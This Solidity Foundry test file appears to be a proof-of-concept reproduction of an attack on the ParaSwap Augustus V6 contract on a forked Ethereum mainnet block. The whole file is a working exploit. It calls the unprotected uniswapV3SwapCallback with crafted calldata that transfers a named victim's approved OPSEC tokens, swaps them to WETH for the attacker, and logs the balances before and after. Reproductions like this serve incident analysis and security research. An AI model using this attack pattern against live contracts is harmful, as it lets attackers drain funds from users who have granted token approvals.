// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {IERC20} from "./IERC20.sol";

interface IParaSwapAugustusV6 {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory data
    ) external;
}

// forge test --fork-url wss://eth.drpc.org --fork-block-number 19470560 -vvv
contract ExploitTest is Test {
    IERC20 private constant WETH =
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant OPSEC =
        IERC20(0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98);
    IERC20 private constant wTAO =
        IERC20(0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44);
    IParaSwapAugustusV6 private constant AugustusV6 =
        IParaSwapAugustusV6(0x00000000FdAC7708D0D360BDDc1bc7d097F47439);
    address private constant from = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Victim OPSEC balance before attack",
            OPSEC.balanceOf(from),
            OPSEC.decimals()
        );

        emit log_named_decimal_uint(
            "Victim approved OPSEC amount before attack",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );

        int256 amount0Delta = 0;
        int256 amount1Delta = 10e18;

        address to = address(this);
        uint256 fee1 = 3000;
        uint256 fee2 = 10_000;
        bytes32 encodedOPSECAddr = 0x8000000000000000000000006a7eff1e2c355ad6eb91bebb5ded49257f3fed98;
        bytes memory data = abi.encode(
            to,
            from,
            address(wTAO),
            address(WETH),
            fee1,
            encodedOPSECAddr,
            address(WETH),
            fee2
        );

        AugustusV6.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Victim OPSEC balance after attack",
            OPSEC.balanceOf(address(from)),
            OPSEC.decimals()
        );

        emit log_named_decimal_uint(
            "Victim approved OPSEC amount after attack",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );
    }
}
